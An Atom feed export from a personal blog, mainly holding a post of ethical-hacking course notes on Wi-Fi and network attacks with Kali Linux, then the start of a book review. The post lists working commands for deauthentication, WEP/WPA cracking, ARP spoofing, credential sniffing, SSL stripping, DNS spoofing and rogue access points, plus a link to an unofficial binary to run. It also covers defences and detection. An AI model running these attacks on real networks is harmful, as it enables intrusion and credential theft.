<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog - Software</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/software.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-08-28T00:00:00+10:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>Network Hacking with Kali Linux</title><link href="https://jackmckew.dev/network-hacking-with-kali-linux.html" rel="alternate"></link><published>2020-08-28T00:00:00+10:00</published><updated>2020-08-28T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-08-28:/network-hacking-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali â€¦&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;. These are notes from the Udemy course: &lt;a href="https://www.udemy.com/course/learn-ethical-hacking-from-scratch/"&gt;https://www.udemy.com/course/learn-ethical-hacking-from-scratch/&lt;/a&gt;, highly recommend this course, very practical and beginner friendly.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="table-of-contents"&gt;Table of Contents &lt;!-- omit in toc --&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#network-hacking"&gt;Network Hacking&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#networking-fundamentals"&gt;Networking Fundamentals&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#checking-network-configuration"&gt;Checking Network Configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#checking-wireless-networks"&gt;Checking Wireless Networks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sniffing-data-from-specific-device"&gt;Sniffing Data from Specific Device&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#deauthentication-attack"&gt;DeAuthentication Attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#gaining-access"&gt;Gaining Access&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#cracking-wep"&gt;Cracking WEP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#fake-authentication-attack"&gt;Fake Authentication Attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cracking-wpawpa2"&gt;Cracking WPA/WPA2&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#with-wps"&gt;With WPS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#without-wps"&gt;Without WPS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#securing-your-network"&gt;Securing your Network&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#post-connection-attacks-mitm-attacks"&gt;Post Connection Attacks (MITM Attacks)&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#discovering-devices-on-the-network"&gt;Discovering Devices on the Network&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#netdiscover"&gt;NetDiscover&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#nmap"&gt;Nmap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#arp-attack"&gt;ARP Attack&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#bettercap"&gt;BetterCap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#https"&gt;HTTPS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#dns-spoofing"&gt;DNS Spoofing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#javascript-code-injection"&gt;JavaScript Code Injection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#wireshark"&gt;WireShark&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#creating-a-honeypot-fake-access-point"&gt;Creating a Honeypot (fake access point)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#detection--security"&gt;Detection &amp;amp; Security&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#detecting-arp-attacks"&gt;Detecting ARP Attacks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#preventing-mitm-attacks"&gt;Preventing MITM Attacks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="network-hacking"&gt;Network Hacking&lt;/h2&gt;
&lt;h3 id="networking-fundamentals"&gt;Networking Fundamentals&lt;/h3&gt;
&lt;h4 id="checking-network-configuration"&gt;Checking Network Configuration&lt;/h4&gt;
&lt;p&gt;Commands to use in terminal to check network state:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ifconfig&lt;/code&gt; for all connection states&lt;/li&gt;
&lt;li&gt;&lt;code&gt;iwconfig&lt;/code&gt; for all &lt;strong&gt;wireless&lt;/strong&gt; connection states&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The MAC address (specified by manufacturer) will be listed in &lt;code&gt;ifconfig&lt;/code&gt; under &lt;code&gt;ether&lt;/code&gt;. You can alter the MAC address in memory directly by:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Disabling that adapter &lt;code&gt;ifconfig eth0 down&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Reassign a new MAC address &lt;code&gt;ifconfig eth0 hw ether 00:11:22:33:44:55&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;The MAC address will be reset upon restarting or reconnecting the device.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="checking-wireless-networks"&gt;Checking Wireless Networks&lt;/h4&gt;
&lt;p&gt;We can seek out wireless networks using &lt;code&gt;airodump-ng&lt;/code&gt;. Ensure that your wireless access point (typically USB device) is in monitor mode with &lt;code&gt;iwconfig wlan0 mode monitor&lt;/code&gt;. Now we can listen to available networks with &lt;code&gt;airodump-ng mon0&lt;/code&gt; (where &lt;code&gt;mon0&lt;/code&gt; is the access point in monitor mode). To listen on a variety of bands (eg, 2.4GHz and 5GHz), use the command &lt;code&gt;airodump-ng --band abg mon0&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id="sniffing-data-from-specific-device"&gt;Sniffing Data from Specific Device&lt;/h4&gt;
&lt;p&gt;To sniff data to a file, the command &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;. This will sniff the data being transmitted by this device, and write it to a series of files. This data can later be analysed by programs like WireShark (because the data captured is potentially encrypted).&lt;/p&gt;
&lt;h4 id="deauthentication-attack"&gt;DeAuthentication Attack&lt;/h4&gt;
&lt;p&gt;This is a denial of service attack, but specifically for use in a Wi-Fi context. Ensuring to run &lt;code&gt;airodump-ng&lt;/code&gt; at the same time during this attack. This is achieved with &lt;code&gt;aireplay-ng&lt;/code&gt; and all that is required is to know the target MAC address (which is available in generic network sniffing (see above)).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;aireplay-ng -D --deauth [#deauthPackets] -a [NetworkMAC] -c [TargetMAC] [wifi card]&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="gaining-access"&gt;Gaining Access&lt;/h3&gt;
&lt;h4 id="cracking-wep"&gt;Cracking WEP&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Capture a large amount of packets &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;run &lt;code&gt;aircrack-ng [filename.cap]&lt;/code&gt; (leave step 1 running in the background)&lt;ul&gt;
&lt;li&gt;To connect with ascii found, copy paste and connect!&lt;/li&gt;
&lt;li&gt;TO CONNECT WITH KEY FOUND!, copy the key after the text provided in the square brackets, remove the colons [:], and copy paste that number when the Wi-Fi asks for a password.&lt;/li&gt;
&lt;li&gt;If the network is not busy and not enough packets are being sent force the network to make packets (see step 3 in &lt;a href="#fake-authentication-attack"&gt;Fake Authentication Attack&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="fake-authentication-attack"&gt;Fake Authentication Attack&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;run &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;run &lt;code&gt;aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;(Note in monitor mode MAC is the first 12 digits after unspec + replace [-] with [:] )&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;make sure your associated with the network (step 2) and run &lt;code&gt;aireplay-ng --arpreplay -b [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;then run the crack &lt;code&gt;aircrack-ng [filename.cap]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;may want to leave all 3 running at once&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="cracking-wpawpa2"&gt;Cracking WPA/WPA2&lt;/h3&gt;
&lt;p&gt;For cracking WPA or WPA2, look out for WPS, this will enable the hack to much simpler as WPS is an 8 digit pin. Otherwise same attack as &lt;a href="#cracking-wep"&gt;WEP&lt;/a&gt;, but will take longer as WPA/WPA2 were designed to solve WEP's problems, thus more secure.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WPS is only available if the router supports WPS (and not PBS(push button authentication))&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="with-wps"&gt;With WPS&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;to find all networks with WPS enabled use &lt;code&gt;wash --interface [WirelessAdapter]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;to attack a network with WPS:&lt;ol&gt;
&lt;li&gt;run fake auth on the router &lt;code&gt;aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt; + leave airodump-ng in background (see WEP step 1)&lt;/li&gt;
&lt;li&gt;use reaver &lt;code&gt;reaver --bssid [targetMAC] --channel [channel] --interface [WirelessAdapter] -vvv --no-associate&lt;/code&gt;
    &amp;gt; if reaver doesn't work use this version of reaver &lt;a href="https://ufile.io/lro4nkdv"&gt;https://ufile.io/lro4nkdv&lt;/a&gt; make sure you run &lt;code&gt;chmod +x reaver&lt;/code&gt; then &lt;code&gt;./reaver [your command here]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="without-wps"&gt;Without WPS&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;monitor and write to a file&lt;/li&gt;
&lt;li&gt;deauthenticate a client to capture handshake&lt;/li&gt;
&lt;li&gt;create a word list:&lt;ol&gt;
&lt;li&gt;Download a word list off the internet or:&lt;ul&gt;
&lt;li&gt;Crunch can be used to create a word list using &lt;code&gt;crunch [min] [max] [characters] -t [pattern] -o [filename]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Need handshake + word list to crack WPA&lt;/li&gt;
&lt;li&gt;to begin cracking the password use &lt;code&gt;aircrack-ng [.cap file] -w [wordlist]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;methods to speedup&lt;ol&gt;
&lt;li&gt;use online services with handshake &amp;amp; word list&lt;/li&gt;
&lt;li&gt;use GPU for cracking&lt;/li&gt;
&lt;li&gt;use rainbow tables&lt;/li&gt;
&lt;li&gt;pipe word list as it is being created&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="securing-your-network"&gt;Securing your Network&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ensure WPA2 is used with a long, complex password with letters, special characters and numbers&lt;/li&gt;
&lt;li&gt;Change the password to the router login (typically admin, admin)&lt;/li&gt;
&lt;li&gt;Disable WPS&lt;/li&gt;
&lt;li&gt;Specify exact MAC addresses to connect (visitors won't like this)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="post-connection-attacks-mitm-attacks"&gt;Post Connection Attacks (MITM Attacks)&lt;/h3&gt;
&lt;h4 id="discovering-devices-on-the-network"&gt;Discovering Devices on the Network&lt;/h4&gt;
&lt;p&gt;Need to gather information (MAC, IP etc.), there are programs that do for you = NetDiscover, Nmap.&lt;/p&gt;
&lt;h5 id="netdiscover"&gt;NetDiscover&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;to use NetDiscover &lt;code&gt;netdiscover -r [ip_range (can only access IPs on the same subnet eg. 10.0.2.xx ends at 254 so eg. 10.0.2.1/24 /24 means all IPs]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;use your ip address with the last .xx being .1&lt;/li&gt;
&lt;li&gt;if using wireless card use &lt;code&gt;-i [wirelessCard]&lt;/code&gt; before &lt;code&gt;-r&lt;/code&gt; or just connect to the network.&lt;/li&gt;
&lt;li&gt;if not finding anything try (interface only if using Wi-Fi, MUST BE IN MANAGED/AUTO MODE)&lt;ul&gt;
&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/8&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/16&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/24&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To make sure of the gateway IP address, please route -n&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="nmap"&gt;Nmap&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Zenmap is the graphical user interface of Nmap use &lt;zenmap&gt;&lt;/zenmap&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;in the target  use your network with xx at the end eg. 10.0.2.1/24 (see above &lt;a href="#netdiscover"&gt;NetDiscover&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;in the profiles there are a number of default commands to use. (ping scan might not list everything)&lt;/li&gt;
&lt;li&gt;use info found to work out things eg. does this model router have any exploits or the phone brand is samsung meaning it's running on android&lt;/li&gt;
&lt;li&gt;Quick Scan(profile) - also shows open ports and the services running on these ports eg. if port 80 is open a webserver is running.&lt;/li&gt;
&lt;li&gt;Quick scan plus - Quick scan but also shows Operating system, device type and the programs and program versions running on the ports.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img alt="Nmap" class="img-fluid" src="https://jackmckew.dev/img/nmap.png"/&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Fun Note: when you jailbrake an iOS device it auto installs an ssh server with default password being: alpine, and uname: root, use &lt;code&gt;ssh root@[phone/server_ip]&lt;/code&gt; then enter yes and alpine&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="arp-attack"&gt;ARP Attack&lt;/h4&gt;
&lt;p&gt;Address Resolution Protocol (ARP) allows us to link ip addresses to MAC addresses.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ARP request sends a signal to all clients on the network asking who has this XXX IP the IP will respond with it's MAC address&lt;/li&gt;
&lt;li&gt;goal is to trick the router into thinking you are the victim and the victim into thinking you are the router. (Man in the Middle)&lt;/li&gt;
&lt;li&gt;Use program ARPspoof &lt;code&gt;arpspoof -i [interface(wificard)] -t [clientip] [gatewayip]&lt;/code&gt; and then &lt;code&gt;arpspoof -i [interface(wificard)] -t [gatewayip] [clientip]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;There is also a tool called bettercap (more features).&lt;/li&gt;
&lt;li&gt;ARPspoof is not default installed use &lt;code&gt;apt-get update &amp;amp;&amp;amp; apt-get install -y dsniff&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Packets will be blocked by default on linux to allow packets to flow though on linux use &lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/code&gt; (echo 0 to revert)&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="bettercap"&gt;BetterCap&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;bettercap -iface [interface]&lt;/code&gt; (interface must be connected to the network you wish to attack)&lt;ul&gt;
&lt;li&gt;use help to get info of modules running or help [module for more]&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.probe on&lt;/code&gt; gets all clients&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.show&lt;/code&gt; shows all clients&lt;/li&gt;
&lt;li&gt;To do Man in the middle in Bettercap use &lt;code&gt;help arp.spoof&lt;/code&gt; you need to modify some of the options, to do this use &lt;code&gt;set [option_name] [value]&lt;/code&gt; (set full.duplux on and set targets in .targets)&lt;/li&gt;
&lt;li&gt;once settings have been set up turn it on &lt;code&gt;arp.spoof on&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;To capture data that is being spoofed and analyse it use the net.sniff module &lt;code&gt;net.sniff on&lt;/code&gt; , you will see entered usernames and passwords under POST&lt;/li&gt;
&lt;li&gt;Instead of doing the above you can use a caplet, to capture data for you&lt;ol&gt;
&lt;li&gt;open a text file and type each command&lt;ul&gt;
&lt;li&gt;&lt;code&gt;net.probe on&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set arp.spoof.fullduplex true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set arp.spoof.targets [target_ips]&lt;/code&gt; (will need to change IP in script each time you use, to target multiple IPs use the comma [,] after each IP)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;arp.spoof on&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.sniff on&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Save the file with .cap&lt;/li&gt;
&lt;li&gt;From Bash use &lt;code&gt;bettercap -iface [interface] -caplet [filename]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="https"&gt;HTTPS&lt;/h4&gt;
&lt;p&gt;HTTP is sent as plain text HTTPS adds a extra layer of security called TLS (Transport layer security) or SSL(Secure Socket Layer), they encrypt traffic being sent. Almost impossible to break, therefore easiest method is to downgrade the connection to HTTP can use a tool called &lt;code&gt;SSL Strip&lt;/code&gt;. BetterCap has a caplet for this however it does not replace all HTTPS links in the loaded pages. This won't work if the target site has implemented HSTS, this can also be bypassed but is more difficult (by tricking the browser into loading a different site). One method is to use &lt;code&gt;hstshijack&lt;/code&gt;, which a resource for this is at &lt;a href="https://github.com/bettercap/caplets/tree/master/hstshijack"&gt;https://github.com/bettercap/caplets/tree/master/hstshijack&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="dns-spoofing"&gt;DNS Spoofing&lt;/h4&gt;
&lt;p&gt;Instead of returning Google's IP return a malicious server. Kali comes installed with a webserver, to start it use &lt;code&gt;service apache2 start&lt;/code&gt; go to KALI's IP to use. The default webpage is stored in /var/www/html.&lt;/p&gt;
&lt;p&gt;To spoof:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start bettercap with the caplet coded above&lt;/li&gt;
&lt;li&gt;Use the dns.spoof module:&lt;ol&gt;
&lt;li&gt;if you do not want to redirect to yourself change the dns.spoof.address value&lt;/li&gt;
&lt;li&gt;set dns.spoof.all so bettercap responds to any dns request &lt;code&gt;set dns.spoof.all true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set dns.spoof.domains to the sites you wish to be redirected to you. &lt;code&gt;set dns.spoof.domains [domain1, domain2]&lt;/code&gt; (use * as a wildcard to do any subdoamin under a website eg.*.kali.org)&lt;/li&gt;
&lt;li&gt;start dns.spoof &lt;code&gt;dns.spoof on&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="javascript-code-injection"&gt;JavaScript Code Injection&lt;/h4&gt;
&lt;p&gt;How to insert JavaScript code:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Have JavaScript code file&lt;/li&gt;
&lt;li&gt;go to the hstshijack plugin /usr/share/bettercap/caplets&lt;/li&gt;
&lt;li&gt;go to the .cap file and add the js code under the payloads, * means all domains then : eg. *:/code.js (otherwise use a domain).&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="wireshark"&gt;WireShark&lt;/h3&gt;
&lt;p&gt;Wireshark is the world's foremost and widely-used network protocol analyzer. Only analyses data flowing though your computer, so works with man in the middle. Go into settings and select the interface you want to start capturing (hold ctl if you want to cap multiple) in output you can send it to a cap file for later analysis. HTTPS will be encrypted so be sure to use hstshijack. Green = TCP packets, Darkblue = DNS, lightblue = UTP, BLACK = TCP with errors.&lt;/p&gt;
&lt;p&gt;Filtering packets:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;in the filters type: http&lt;/li&gt;
&lt;li&gt;Double Click to get more info. Under the Hypertext Transfer Protocol section important info is shown.&lt;/li&gt;
&lt;li&gt;can see what type next too the info&lt;/li&gt;
&lt;li&gt;right click a packet and go follow &amp;gt; http stream to see exactly what was sent.&lt;/li&gt;
&lt;li&gt;again under the double click &amp;gt; Hypertext Transfer Protocol you can see what was requested or responded.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;To find usernames and passwords check under POST requests and under the html form url encoded. ctl + f to find data, set search to packet details and set last one to string and oyu can type a name like admin etc.&lt;/p&gt;
&lt;p&gt;If you want to put BetterCap data in a file use &lt;code&gt;set net.sniff.output [file]&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="creating-a-honeypot-fake-access-point"&gt;Creating a Honeypot (fake access point)&lt;/h3&gt;
&lt;p&gt;We use &lt;code&gt;hostapd-mana&lt;/code&gt; to achieve this, mana is a featureful rogue access point first presented at Defcon 22 by Dominic White &lt;a href="https://github.com/sensepost/hostapd-mana"&gt;https://github.com/sensepost/hostapd-mana&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Use Mana:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;start-noupstream.sh&lt;/code&gt; -Starts access point with no internet access&lt;/li&gt;
&lt;li&gt;&lt;code&gt;start-nat-simple.sh&lt;/code&gt; -Starts an access point with internet access (use this)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;start-nat-full.sh&lt;/code&gt; -Starts a access point and automatically starts sniffing data, bypass https&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;To install Mana on Linux:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;apt-get update&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;apt-get --yes install build-essential pkg-config git libnl-genl-3-dev libssl-dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd /tmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git clone https://github.com/sensepost/hostapd-mana&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd hostapd-mana&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make -C hostapd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mv /tmp/hostapd-mana/hostapd/ /usr/lib/mana-toolkit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd /usr/share/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git clone --depth 1 https://github.com/sensepost/mana.git&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mv mana mana-toolkit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mkdir /etc/mana-toolkit/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mv mana-toolkit/run-mana/conf/*.conf /etc/mana-toolkit/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Editing Mana:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edit mana settings in /etc/mana-toolkit/hostatp-mana.conf &amp;gt; check interface + SSID (Name).&lt;/li&gt;
&lt;li&gt;edit start script in /usr/share/mana-toolkit/run-mana/start-nat-simple.sh &amp;gt; check upstream interface (set to the one that has internet access), check phy (the card that is going to broadcast the network[wlan0]).&lt;/li&gt;
&lt;li&gt;start the script &lt;code&gt;bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="detection-security"&gt;Detection &amp;amp; Security&lt;/h3&gt;
&lt;h4 id="detecting-arp-attacks"&gt;Detecting ARP Attacks&lt;/h4&gt;
&lt;p&gt;On Windows use &lt;code&gt;arp -a&lt;/code&gt; if the gateway matches another MAC in the network = bad, not practical to type every time and constantly so use XARP (&lt;a href="http://www.xarp.net/"&gt;http://www.xarp.net/&lt;/a&gt;)!&lt;/p&gt;
&lt;p&gt;To discover suspicious activity on a network use wireshark. &amp;gt; go to preferances &amp;gt; protocols &amp;gt; ARP &amp;gt; enable detect arp request storms. Broadcast packets are dangerous that is the hacker detecting the network. If you go to Expert Information, you can see the storm info. Also under expert information you can see warning for arp poisoning and other things. You can use static arp tables (you must manually configure) system will refuse if arp changes. Problem if you need to connect to different networks.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This is only detection, not prevention. There is not much we can do after detecting except exiting that network or changing access control.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="preventing-mitm-attacks"&gt;Preventing MITM Attacks&lt;/h4&gt;
&lt;p&gt;Make sure everything is encrypted using https (Plugin to do this automatically &lt;a href="https://www.eff.org/https-everywhere"&gt;https://www.eff.org/https-everywhere&lt;/a&gt;) or use a VPN, preferably use both!.&lt;/p&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry><entry><title>Book Review: The Pragmatic Programmer</title><link href="https://jackmckew.dev/book-review-the-pragmatic-programmer.html" rel="alternate"></link><published>2020-08-14T00:00:00+10:00</published><updated>2020-08-14T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-08-14:/book-review-the-pragmatic-programmer.html</id><summary type="html">&lt;body&gt;&lt;p&gt;The Pragmatic Programmer is heiled as one of the must-reads for all developers and is extremely well known. It is comparable to a hand book full of tips and tricks to develop more robust software, and also introduces lots of concepts throughout that can be used to improve the development â€¦&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;The Pragmatic Programmer is heiled as one of the must-reads for all developers and is extremely well known. It is comparable to a hand book full of tips and tricks to develop more robust software, and also introduces lots of concepts throughout that can be used to improve the development workflow as it evolves for projects. Thus here are my key takeaways, I strongly believe that this is a book you read once, learn a stack from and when you revisit it with more experience down the line, you'll learn even more.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This review is based on the 20th anniversary edition of the book.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Most of the points below relate to specific chapters/sections.&lt;/p&gt;
&lt;h2 id="soft-skills"&gt;Soft Skills&lt;/h2&gt;
&lt;p&gt;While software development is a technical role, soft skills are still one of the most paramount traits in effective developers and working with others in any scenario. No matter what you do, if you are an effective communicator, this will make you much more valuable in any context.&lt;/p&gt;
&lt;p&gt;Skills for being an effective communicator include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Active Listening&lt;/li&gt;
&lt;li&gt;Collaboration&lt;/li&gt;
&lt;li&gt;Presentation of Ideas&lt;/li&gt;
&lt;li&gt;Teamwork&lt;/li&gt;
&lt;li&gt;Adaptability&lt;/li&gt;
&lt;li&gt;Conflict Resolution&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="no-broken-windows"&gt;No Broken Windows&lt;/h2&gt;
